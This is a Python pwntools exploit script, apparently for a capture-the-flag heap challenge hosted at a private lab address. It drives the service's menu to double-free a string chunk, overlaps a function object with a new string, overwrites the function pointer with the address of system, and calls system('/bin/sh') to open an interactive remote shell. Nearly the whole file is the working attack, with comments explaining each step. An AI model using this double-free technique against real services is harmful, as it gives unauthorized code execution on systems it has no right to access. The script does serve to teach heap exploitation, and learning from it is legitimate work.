from pwn import *

r = remote("10.0.10.10", 5008)

INDEX_REQUEST = "Please specify an index.\n> "

def get_menu():
    r.recvuntil(" 5. Exit.\n");

def make_string(index, contents):
    r.sendline("1")
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(index))
    r.recvuntil("OK, send data to put there.\n> ")
    r.sendline(contents)
    get_menu()

def make_function(index, func):
    r.sendline("2")
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(index))
    r.recvuntil(" 4. puts\n> ");
    r.sendline(str(func))
    get_menu()

def call_function(func, string):
    r.sendline("3")
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(func))
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(string))
    r.recvuntil("OK, calling . . .\n")

def delete_string(index):
    r.sendline("4")
    r.recvuntil(INDEX_REQUEST)
    r.sendline(str(index))
    get_menu()

def exit():
    r.sendline("5")

get_menu()

# Make the /bin/sh string that we will use later in our call to system
make_string(0, "/bin/sh")
# Create the victim string that will be double-freed
make_string(1, "blah")

# Free it twice, placing the chunk on the freelist twice!
delete_string(1)
delete_string(1)

# Make a new function object that will be allocated at the same place as string #1
make_function(0, 4)

# Make a new string object that will be allocated at the same place as string #1 and function #0.
# We set the contents of this string to the address of system
# so that the address of the funciton is overwritten with the address of system
make_string(2, p64(0x4006f0))

# Call function #0, which now points to system, and pass it the "/bin/sh" string from the start
# i.e. Call system("/bin/sh")
call_function(0, 0)

# Shell!
r.interactive()
